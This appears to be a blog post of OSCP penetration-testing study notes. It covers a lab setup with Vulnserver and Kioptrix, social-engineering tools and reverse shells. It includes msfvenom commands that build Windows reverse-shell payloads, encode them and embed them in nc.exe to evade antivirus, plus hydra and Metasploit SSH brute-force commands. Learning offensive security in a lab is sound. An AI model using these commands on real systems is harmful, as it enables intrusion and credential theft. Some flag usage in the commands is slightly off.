---
title: OSCP Study Notes - 2021/03/11
date: 2021-03-11 22:22:05
tags: [OSCP, Study Notes, Penetration Testing]
---

# Fuzzing
Download [Vulnserver](https://github.com/stephenbradshaw/vulnserver)
Download [immunity debugger](https://www.immunityinc.com/products/debugger/)

...
Skip since can not setup Vulnserver on host, not safe btw

# Client Side Attack,
Need a vulnerable web browser, something like phishing  

wait for victim to visit your site

setoolkit - social engineering attack

46->2 windows reverse_TCP meterpreter, errors again... guess my host is very secure

## Java Applet Attacks


# Reverse Shell
In a typical remote system access scenario, the user is the client and the target machine is the server. The user initiates a remote shell connection and the target system listens for such connections. With a reverse shell, the roles are opposite. It is the target machine that initiates the connection to the user, and the user’s computer listens for incoming connections on a specified port.

# generate Virus
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o shell1.exe

# check options
msfvenom -p windows/shell_reverse_tcp --list-options
```
MsfVenom - a Metasploit standalone payload generator.  
-p, --payload  

# Anti Virus
virustotl, scan for virus, test if it pass anti virus

## add encoding
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o -e x86/shikata_ga_nai shell2.exe
```
About shikata ga nai encoder: https://www.boozallen.com/c/insight/blog/the-shikata-ga-nai-encoder.html

## embeded to another binary
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o -e x86/shikata_ga_nai -x /usr/share/windows-binaries/nc.exe shell3.exe
```
-x, --template

Create virus youself will make the virustotal down

## Pre-exploit password attacks
brute force attack, last resort

ncrack, medusa, hydra

wordlist:
```
gzip -d /usr/share/wordlists/rockyou.txt.gz > ...
```

Use Kioptrix VM

```
hydra -v -l root -P rockyou.txt 192.168.0.22 ssh
```
-l login user  
ssh has log, will be detected

get conenction reset error

try to manually connect ssh, get 
```
Unable to negotiate with 192.168.0.22 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

add to ~/.ssh/config
```
Host 192.168.0.22
        KexAlgorithms +diffie-hellman-group1-sha1
        Ciphers +aes128-cbc
```

add `-c` to wait for 1s between each retry  
the  wait time in seconds per login attempt over all threads  


### Metasplit brute force
```
use auxiliary/scanner/ssh/ssh_login
```
